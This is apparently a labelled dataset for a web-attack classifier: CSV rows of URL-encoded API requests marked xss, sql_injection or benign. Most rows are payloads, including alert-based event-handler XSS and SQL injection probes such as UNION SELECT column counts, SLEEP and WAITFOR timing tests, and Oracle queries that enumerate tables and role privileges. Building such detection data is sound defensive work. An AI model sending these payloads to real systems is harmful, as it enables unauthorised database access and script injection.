text,label
/api/v2/comments/%3Ckeygen+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fkeygen%3E,xss
/api/v1/reviews?body=%3Cframe+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fframe%3E,xss
/api/v2/items/622796?key=468128,benign
/api/v1/feedback?message=%3Cdt+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdt%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cspan+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fspan%3E,xss
/api/v2/comments/%3Cnoframes+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fnoframes%3E%3Cinput+autofocus%3E,xss
/v1/search?q=180943,benign
/v1/search?q=%3Cx+oncut%3Dalert%281%29%3Ecopy+this%21,xss
/v1/profile?bio=%22onclick%3Dprompt%288%29%3E%22%40x.y,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cobject+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fobject%3E,xss
/api/v1/comments?text=%3Col+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fol%3E,xss
/v1/orders?customer_id=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--&status=active,sql_injection
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ch1+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fh1%3E,xss
/api/v2/comments/%3Cbdi+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbdi%3E,xss
/v1/projects/proj-2302/databases/(default)/documents/users/alice,benign
/api/v1/login?username=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30&password=pass,sql_injection
/api/v1/comments?text=%3Cdetails+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdetails%3E,xss
/api/v2/comments/%3Cscript+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,xss
/api/v1/comments?text=%3Ccol+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fcol%3E%3Cinput+autofocus%3E,xss
/api/v2/search?q=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%23&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cfigure+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Ffigure%3E,xss
/api/v1/search?q=872443,benign
/api/v1/feedback?message=%3Carticle+onclick%3D%22alert%281%29%22%3Etest%3C%2Farticle%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+1%23&status=active,sql_injection
/api/v2/profile?id=%3Cmeta+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fmeta%3E,xss
/api/v2/profile?id=%3Ckbd+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fkbd%3E,xss
/api/v2/comments/%3Cdt+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdt%3E,xss
/api/v2/comments/%3Csection+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fsection%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cbdo+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fbdo%3E,xss
/v1/search?q=%3Cxmp+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fxmp%3E,xss
/v1/search?q=%3Csummary+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsummary%3E,xss
/api/v1/login?username=or+pg_sleep%28__TIME__%29--%22&password=pass,sql_injection
/api/v1/products/389907,benign
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ci+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fi%3E,xss
/api/v1/reviews?body=%3Cpre+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fpre%3E,xss
/api/v2/users/38781,benign
/api/v2/comments/%3Cbdi+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fbdi%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cstyle+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fstyle%3E,xss
/api/v1/orders/office+chair,benign
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cplaintext+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fplaintext%3E,xss
/v1/profile?bio=%3Cbody+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbody%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cimage+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fimage%3E,xss
/v1/search?q=%3Cmenu+onclick%3D%22alert%281%29%22%3Etest%3C%2Fmenu%3E,xss
/api/v2/search?q=ORDER+BY+6%23&key=API_KEY,sql_injection
/api/v1/login?username=%27%29+or+%271%27%3D%271%27%2F%2A&password=pass,sql_injection
/api/v1/feedback?message=%3Ctr+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ftr%3E,xss
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ccode+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fcode%3E,xss
/v1/search?q=%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E,xss
/api/v2/profile?id=%3Cbasefont+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fbasefont%3E,xss
/api/v2/profile?id=%3Cframe+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fframe%3E,xss
/api/v2/comments/%3Ctextarea+onbeforepaste%3Dalert%281%29+autofocus%3E%3C%2Ftextarea%3E,xss
/api/v1/search?q=admin%27+or+1%3D1--,sql_injection
/api/v1/comments?text=%3Ciframe+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fiframe%3E,xss
/v1/profile?bio=%3Caddress+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Faddress%3E,xss
/api/v1/reviews?body=%3Cvideo+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fvideo%3E,xss
/api/v2/comments/%3Chtml+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fhtml%3E,xss
/api/v1/feedback?message=%3Cembed+id%3Dx+onfocus%3Dalert%281%29+type%3Dtext%2Fhtml%3E,xss
/v1/profile?bio=%3Cstyle+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fstyle%3E,xss
/api/v1/users?id=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26--,sql_injection
/api/v2/items/488003?key=AK-XY-999,benign
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cli+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fli%3E,xss
/api/v1/reviews?body=%3Cslot+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fslot%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cisindex+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fisindex%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ctr+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Ftr%3E,xss
/api/v1/comments?text=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,xss
/api/v1/reviews?body=%3Cb+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fb%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cform%3E%3Cbutton+formaction%3D%22javascript%3Aalert%281%29%22%3E,xss
/v1/profile?bio=%3Cstrong+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fstrong%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Cmenuitem+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fmenuitem%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cpre+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fpre%3E,xss
/v1/products/%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28table_name%29+FROM+%28SELECT+DISTINCT%28table_name%29%2C+ROWNUM+AS+LIMIT+FROM+sys.all_tables%29+WHERE+LIMIT%3D1%29%29+AND+%27i%27%3D%27i,sql_injection
/v1/orders?customer_id=handler&status=active,sql_injection
/api/v1/users?id=%27+or+sleep%28__TIME__%29%3D%27,sql_injection
/v1/profile?bio=%3Cframe+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fframe%3E,xss
/api/v1/search?q=1+or+pg_sleep%285%29--,sql_injection
/api/v2/comments/%3Cp+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fp%3E,xss
/api/v1/comments?text=%3Csmall+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fsmall%3E%3Cinput+autofocus%3E,xss
/v1/products/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8--,sql_injection
/api/v2/items/%27or+1%3D1+or+%27%27%3D%27?key=API_KEY,sql_injection
/api/v1/users?id=create+table+myfile+%28input+TEXT%29%3B,sql_injection
/api/v2/comments/%3Cmenuitem+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenuitem%3E,xss
/v1/search?q=%3Cisindex+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fisindex%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cfigure+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Ffigure%3E,xss
/api/v1/reviews?body=%3Cmulticol+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fmulticol%3E,xss
/api/v1/reviews?body=%3Cvideo+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fvideo%3E,xss
/api/v1/reviews?body=%3Cth+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fth%3E,xss
/v1/profile?bio=%3Ch1+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fh1%3E,xss
/v1/search?q=%3Cmarquee+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fmarquee%3E,xss
/api/v1/feedback?message=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E,xss
/api/v1/users?id=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,sql_injection
/v1/search?q=%3Cisindex+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fisindex%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Croot%2F%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v1/reviews?body=%3Cfigure+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigure%3E,xss
/api/v2/comments/%3Csvg%3E%3Col+onload%3Dalert%281%29%3E%3C%2Fol%3E,xss
/api/v1/comments?text=%3Cfigcaption+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Ffigcaption%3E,xss
/v1/profile?bio=%3Cdialog+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fdialog%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3CX+onxxx%3D1,xss
/api/v2/search?q=%29%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&key=API_KEY,sql_injection
/api/v2/profile?id=%3Ctt+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftt%3E,xss
/api/v2/profile?id=%3Cbasefont+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fbasefont%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ccanvas+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fcanvas%3E,xss
/v1/search?q=%3Ckeygen+id%3Dx+onfocus%3Dalert%281%29%3E,xss
/api/v2/comments/%3Coptgroup+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foptgroup%3E,xss
/api/v2/comments/%3Cbdi+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fbdi%3E,xss
/api/v2/items/KEY-0001?key=601335,benign
/v1/profile?bio=%3Ctbody+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Ftbody%3E,xss
/api/v1/feedback?message=%3Cembed+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fembed%3E,xss
/api/v1/login?username=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23&password=pass,sql_injection
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Ccol+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fcol%3E,xss
/api/v2/items/AND+3516%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT+%28CASE+WHEN+%283516%3D3516%29+THEN+1+ELSE+0+END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29+AS+NUMERIC%29?key=API_KEY,sql_injection
/v1/search?q=%3Cmeter+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeter%3E,xss
/api/v1/login?username=%22%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29%2F%2A&password=pass,sql_injection
/v1/profile?bio=%3Cdiv+id%3D%2292%22%3E%3Cdiv+style%3D%22background%3Aurl%28http%3A%2F%2Ffoo.f%2Ff+oo%2F%3Bcolor%3Ared%2F%2A%2Ffoo.jpg%29%3B%22%3EX%3C%2Fdiv%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2293%22%3E%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Aalert%2893%29%29%3B%22%3EX%3C%2Fdiv%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v2/profile?id=%3Cpicture+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fpicture%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cthead+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fthead%3E,xss
/api/v1/users?id=1%5C%271,sql_injection
/api/v2/search?q=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%29%2520%2F%2A&key=API_KEY,sql_injection
/v1/profile?bio=%3Cmeta+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fmeta%3E,xss
/api/v1/orders?customer_id=665621,benign
/api/v2/search?q=UNION+ALL+SELECT&key=API_KEY,sql_injection
/api/v2/comments/%3Cb+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fb%3E,xss
/api/v1/comments?text=%3Csmall+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fsmall%3E,xss
/v1/products/%29%29%3Bwaitfor+delay+%270%3A0%3A5%27--,sql_injection
/v1/search?q=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cmap+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fmap%3E,xss
/api/v1/users/616887,benign
/v1/search?q=%3Cscript+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fscript%3E,xss
/api/v1/feedback?message=%3Csvg%3E%3Cnoframes+onload%3Dalert%281%29%3E%3C%2Fnoframes%3E,xss
/api/v2/search?q=clientkey42&key=625921,benign
/api/v1/profile?id=147330,benign
/v1/profile?bio=%3Ca+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fa%3E%3Cinput+autofocus%3E,xss
/prod/users/107929/orders,benign
/providers/Microsoft.Authorization/roleAssignments/665492?api-version=2020-10-01-preview,benign
/v1/orders?customer_id=%27%29%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&status=active,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cvar+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fvar%3E,xss
/api/v1/login?username=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28granted_role%29+FROM+%28SELECT+DISTINCT%28granted_role%29%2C+ROWNUM+AS+LIMIT+FROM+dba_role_privs+WHERE+GRANTEE%3DSYS.LOGINUSER%29+WHERE+LIMIT%3D4%29%29+AND+%27i%27%3D%27i&password=pass,sql_injection
/api/v2/profile?id=%3Ci+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fi%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ch1+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fh1%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cth+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fth%3E,xss
/v1/search?q=%3Ctable+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Ftable%3E,xss
/api/v2/comments/%3Clegend+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flegend%3E,xss
/api/v1/login?username=%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%29%2520--&password=pass,sql_injection
/v1/profile?bio=%3Ctrack+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftrack%3E,xss
/v1/products/%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%29%2520%2523,sql_injection
/api/v1/feedback?message=%3Clisting+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/v1/profile?bio=%3Csmall+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fsmall%3E,xss
/v1/search?q=%3Ch1+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fh1%3E,xss
/api/v1/reviews?body=%3Cinput+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Finput%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cframe+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fframe%3E,xss
/api/v1/cart?user_id=737624&action=view,benign
/api/v2/comments/%3Crt+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Frt%3E%3Cinput+autofocus%3E,xss
/api/v2/search?q=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23--&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cisindex+type%3Dimage+src%3D1+onerror%3Dalert%281%29%3E,xss
/v1/profile?bio=%3Cfont+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffont%3E,xss
/api/v2/comments/%3Cdfn+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdfn%3E,xss
/api/v1/comments?text=%3Cstyle+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstyle%3E,xss
/api/v1/reviews?body=%3Crt+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frt%3E,xss
/api/v1/login?username=%2520or%2520x%3Dx&password=pass,sql_injection
/v1/search?q=%3Csamp+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fsamp%3E,xss
/api/v1/comments?text=%3Ca+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fa%3E,xss
/api/v1/reviews?body=%3Cq+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fq%3E,xss
/api/v2/search?q=create+table+myfile+%28input+TEXT%29%3B&key=API_KEY,sql_injection
/api/v2/comments/%3Cdel+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdel%3E,xss
/api/v2/comments/%3Cform%3E%3Cbutton+formaction%3Djavascript%3Aalert%281%29%3Eclick,xss
/api/v2/comments/%3Caside+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Faside%3E,xss
/api/v2/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14&key=API_KEY,sql_injection
/api/v2/users/158642,benign
/v1/search?q=%3Cdiv+style%3Dxss%3Aexpression%281%29-alert%281%29%3E,xss
/api/v1/login?username=%27+OR+%27x%27%3D%27x%27%23%3B&password=pass,sql_injection
/api/v1/comments?text=%3Cplaintext+onclick%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/api/v2/search?q=%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523&key=API_KEY,sql_injection
/api/v2/comments/%3Cscript+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fscript%3E,xss
/api/v1/comments?text=%3Cbody%3EHello%3C%2Fbody%3E,xss
/v1/orders?customer_id=%27+or+1%3D1+or+%27%27%3D%27&status=active,sql_injection
/v1/search?q=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cdialog+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fdialog%3E,xss
/api/v2/profile?id=%3Cpicture+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpicture%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%23,sql_injection
/api/v1/feedback?message=%3Cframe+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fframe%3E,xss
/api/v1/comments?text=%3Cul+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ful%3E%3Cinput+autofocus%3E,xss
/api/v2/items/red+phone?key=826237,benign
/api/v2/profile?id=%3Cmenuitem+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fmenuitem%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Ccode+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fcode%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cbgsound+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fbgsound%3E,xss
/api/v1/login?username=%27+or+%27%27+%27&password=pass,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ccol+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fcol%3E,xss
/api/v2/search?q=288205&key=smart+watch,benign
/v1/search?q=36406,benign
/api/v1/comments?text=%3Caside+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Faside%3E,xss
/v1/orders?customer_id=%27+%7D+%5D%2C+%24comment%3A%27successful+MongoDB+injection%27&status=active,sql_injection
/api/v2/profile?id=%3Ch1+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fh1%3E,xss
/v1/search?q=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cmarquee+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fmarquee%3E,xss
